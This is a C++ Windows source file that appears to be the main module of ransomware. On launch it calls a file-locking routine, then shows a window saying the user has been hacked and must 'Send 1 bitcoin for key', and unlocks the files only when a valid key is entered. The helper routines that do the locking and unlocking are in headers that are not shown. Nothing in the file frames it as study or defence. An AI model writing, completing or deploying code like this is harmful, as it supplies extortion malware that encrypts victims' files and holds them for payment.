#pragma warning (disable : 4996)
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='x86' publicKeyToken='6595b64144ccf1df' language='*'\"")

#pragma comment(lib, "crypt32.lib")


#include <windows.h>

#include "config.h"
#include "resource.h"
#include "CryptOperation.h"
#include "GeneralOperation.h"

LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
void CenterWindow(HWND);
void GenerateScreenComponents(HWND);
void InitWindow(HINSTANCE & hInstance);

static HWND bitcoinEdit;
static HWND passwordEdit;

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
	GeneralOperation::LockFiles();
	InitWindow(hInstance);
	return 0;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg,
	WPARAM wParam, LPARAM lParam) {

	switch (msg) {

	case WM_CREATE:
		CenterWindow(hwnd);
		GenerateScreenComponents(hwnd);
		break;

	case WM_COMMAND:
		if (LOWORD(wParam) == ID_OPEN_BUTTON) {
			int len = GetWindowTextLengthW(passwordEdit) + 1;
			wchar_t * text = new wchar_t[len];
			GetWindowTextW(passwordEdit, text, len);

			std::wstring ws(text);
			std::string key(ws.begin(), ws.end());

			if (CryptOperation::ValidatePassword(key))
				GeneralOperation::UnlockFiles(key);
			else
				MessageBoxW(NULL, CHEATER_MESSAGE, L"", MB_OK);

			free(text);
		}

		if (LOWORD(wParam) == ID_CANCEL_BUTTON) {

			PostQuitMessage(0);
		}

		break;

	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	}

	return DefWindowProcW(hwnd, msg, wParam, lParam);
}

void CenterWindow(HWND hwnd) {

	RECT rc = { 0 };

	GetWindowRect(hwnd, &rc);
	int win_w = rc.right - rc.left;
	int win_h = rc.bottom - rc.top;

	int screen_w = GetSystemMetrics(SM_CXSCREEN);
	int screen_h = GetSystemMetrics(SM_CYSCREEN);

	SetWindowPos(hwnd, HWND_TOP, (screen_w - win_w) / 2, (screen_h - win_h) / 2, 0, 0, SWP_NOSIZE);
}

void GenerateScreenComponents(HWND hwnd) {

	CreateWindowW(L"Static", L"Sorry But You Have Been Hacked", WS_CHILD | WS_VISIBLE | SS_LEFT, 60, 20, 300, 230, hwnd, (HMENU)ID_DUMMY, NULL, NULL);
	CreateWindowW(L"Static", L"Send 1 bitcoin for key", WS_CHILD | WS_VISIBLE | SS_LEFT, 95, 40, 300, 230, hwnd, (HMENU)ID_DUMMY, NULL, NULL);
	CreateWindowW(L"Static", L"Bitcoin Number", WS_CHILD | WS_VISIBLE | SS_LEFT, 20, 80, 300, 230, hwnd, (HMENU)ID_DUMMY, NULL, NULL);
	CreateWindowW(L"Static", L"Key", WS_CHILD | WS_VISIBLE | SS_LEFT, 20, 110, 300, 230, hwnd, (HMENU)ID_DUMMY, NULL, NULL);

	CreateWindowW(L"Button", NULL, WS_CHILD | WS_VISIBLE | BS_GROUPBOX, 5, 0, 352, 140, hwnd, (HMENU)0, NULL, NULL);

	bitcoinEdit = CreateWindowW(L"Edit", NULL, WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL, 70, 80, 250, 20, hwnd, (HMENU)ID_BITCOIN_TEXT, NULL, NULL);
	passwordEdit = CreateWindowW(L"Edit", NULL, WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL, 70, 110, 250, 20, hwnd, (HMENU)ID_PASSWORD_TEXT, NULL, NULL);

	CreateWindowW(L"button", L"Open System", WS_VISIBLE | WS_CHILD, 130, 150, 95, 25, hwnd, (HMENU)ID_OPEN_BUTTON, NULL, NULL);
	CreateWindowW(L"button", L"Cancel", WS_VISIBLE | WS_CHILD, 260, 150, 95, 25, hwnd, (HMENU)ID_CANCEL_BUTTON, NULL, NULL);
	SetWindowTextW(bitcoinEdit, L"BITCOIN IS HERE");
	::EnableWindow(bitcoinEdit, false);
}

void InitWindow(HINSTANCE & hInstance)
{
	MSG  msg;
	WNDCLASSW wc = { 0 };
	wc.lpszClassName = L"Center";
	wc.hInstance = hInstance;
	wc.hbrBackground = GetSysColorBrush(COLOR_3DFACE);
	wc.lpfnWndProc = WndProc;
	wc.hCursor = LoadCursor(0, IDC_ARROW);

	RegisterClassW(&wc);
	CreateWindowW(wc.lpszClassName, APPLICATION_NAME, WS_OVERLAPPEDWINDOW | WS_VISIBLE, 100, 100, 380, 225, 0, 0, hInstance, 0);

	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
}